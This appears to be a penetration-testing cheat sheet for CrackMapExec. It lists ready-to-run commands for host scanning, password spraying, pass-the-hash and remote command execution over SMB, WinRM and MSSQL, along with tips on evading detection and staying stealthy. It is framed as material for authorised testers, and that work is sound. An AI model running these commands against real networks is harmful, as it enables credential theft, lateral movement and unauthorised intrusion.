---
icon: map
---

# CrackmapExec

## The CrackMapExec (CME) Masterclass: Professional Active Directory & Network Pentesting Swiss Army Knife

CrackMapExec (CME) is a powerful and versatile post-exploitation tool designed to automate network reconnaissance, credential testing, lateral movement, and privilege escalation in Windows Active Directory environments. It integrates many pentesting operations into a unified interface, accelerating assessments and red team campaigns.

***

### I. Environment Setup: Dynamic Variables

Set up environment variables for efficient, repeatable commands:

```bash
export TARGET_RANGE="192.168.1.0/24"
export USERNAME="administrator"
export PASSWORD="Password123!"
export HASH=""
export DOMAIN="corp.local"
export SMB_PORT=445
export PROTOCOL="smb"           # Protocol to use: smb, winrm, mssql, etc.
export COMMAND="ipconfig"       # Command to execute remotely
export THREADS=20
export OUTPUT_DIR="cme-results"
export SESSION_NAME="htb_assessment"

```

***

### II. Core Capabilities & Workflow

* **Network-wide Discovery:** Scan IP ranges to identify live Windows hosts with SMB and other services.
* **Credential Validation:** Perform password spraying, brute force, and pass-the-hash attacks across multiple protocols.
* **Lateral Movement & Remote Execution:** Run arbitrary commands remotely with `smbexec`, `wmiexec`, `psexec`, and `atexec` modules.
* **Credential Dumping & Harvesting:** Extract credentials, cached hashes, and tickets via integrated Impacket functionality and interfaces to Mimikatz.
* **Active Directory Enumeration:** Enumerate users, groups, shares, sessions, GPOs, and local admins with built-in commands.
* **Session & Credential Management:** Stores authenticated sessions and gathered credentials for re-use and chained attacks.
* **Extensible Module Support:** Load custom modules and scripts in Python to extend capabilities.
* **Proxy & Multithreading Support:** Operates via SOCKS proxy with multiple concurrent threads for speed.
* **Integrated Output & Reporting:** CLI-friendly output and export to files for documentation.
* **Cross-Platform:** Native support for Linux and Windows environments.

***

### III. Professional Usage Examples

#### 1. Network SMB Scan for Live Hosts

```bash
crackmapexec smb $TARGET_RANGE

```

#### 2. Check Valid Credentials Across a Network (Username + Password)

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD

```

#### 3. Use Pass-the-Hash for Authentication

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME --hashes $HASH

```

#### 4. Execute Remote Command via SMBexec

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD -x "$COMMAND"

```

#### 5. Dump SMB Shares and Local Admin Users

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD --shares --local-auth

```

#### 6. Enumerate Logged-in Users on Remote Hosts

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD --loggedon-users

```

#### 7. Password Spraying Attack

```bash
crackmapexec smb $TARGET_RANGE -u users.txt -p passwords.txt

```

#### 8. Using WinRM for Remote Command Execution

```bash
crackmapexec winrm $TARGET_RANGE -u $USERNAME -p $PASSWORD -x "$COMMAND"

```

#### 9. Interact with MSSQL Servers for Queries

```bash
crackmapexec mssql $TARGET_RANGE -u $USERNAME -p $PASSWORD --query "SELECT * FROM sys.databases"

```

#### 10. Save Results to Output File

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD -x "$COMMAND" -o $OUTPUT_DIR/results.txt

```

***

### IV. Advanced Techniques & Scenarios

* **Session Management:** Use CME’s database (`cmedb`) to store credentials and discovered data for offline use or chained operations.
* **Custom Module Development:** Write and load Python modules to customize reconnaissance or attacks.
* **Evading Detection:** Use proxy options, delays, and limit concurrent threads to avoid triggering defenses.
* **Credential Reuse:** Combine harvested hashes or tickets within CME for lateral movement.
* **Multi-Protocol Exploitation:** Run commands or extract data from SMB, WinRM, MSSQL, LDAP, and others.
* **Integration with BloodHound:** Export enumeration data for graph visualization and attack path discovery.
* **Password Spraying & Brute Force:** Efficiently test large numbers of user/password combos with automated lockout prevention.
* **Post-Exploitation:** Deploy PowerShell or Meterpreter shells remotely using integrated CME commands.

***

### V. Real-World Workflow Example

1. **Export Variables:**

```bash
export TARGET_RANGE="10.10.10.0/24"
export USERNAME="admin"
export PASSWORD="Pass1234!"
export COMMAND="whoami"
export OUTPUT_DIR="cme_scans"

```

1. **Scan Network for SMB Hosts:**

```bash
crackmapexec smb $TARGET_RANGE

```

1. **Authenticate Using Credentials and Enumerate Shares:**

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD --shares

```

1. **Run Remote Command on Target Range:**

```bash
crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD -x "$COMMAND" -o $OUTPUT_DIR/cmd_output.txt

```

1. **Password Spraying with Lists:**

```bash
crackmapexec smb $TARGET_RANGE -u users.txt -p passwords.txt

```

1. **Harvest Credentials and Plan Lateral Movement:**

Use output data for next-stage post-exploitation with Metasploit or BloodHound.

***

### VI. Pro Tips & Best Practices

* Store and update credentials in CME’s database to streamline repeated actions.
* Combine CME enumeration with BloodHound for efficient AD attack surface mapping.
* Avoid noisy operations by tuning threads and using proxies.
* Use pass-the-hash cautiously to avoid detection.
* Regularly update CME and Impacket dependencies for new features.
* Leverage CME’s modules for multi-protocol exploitation covering SMB, WinRM, MSSQL, LDAP.
* Document findings, integration points, and escalate methodically within scope.
* Conduct live session dumping and lateral movement carefully to maintain presence stealthily.

***

This professional CrackMapExec guide empowers penetration testers to efficiently perform AD enumeration, password attacks, remote execution, credential harvesting, and lateral movement in Windows environments with automation, speed, and safety.

Sources
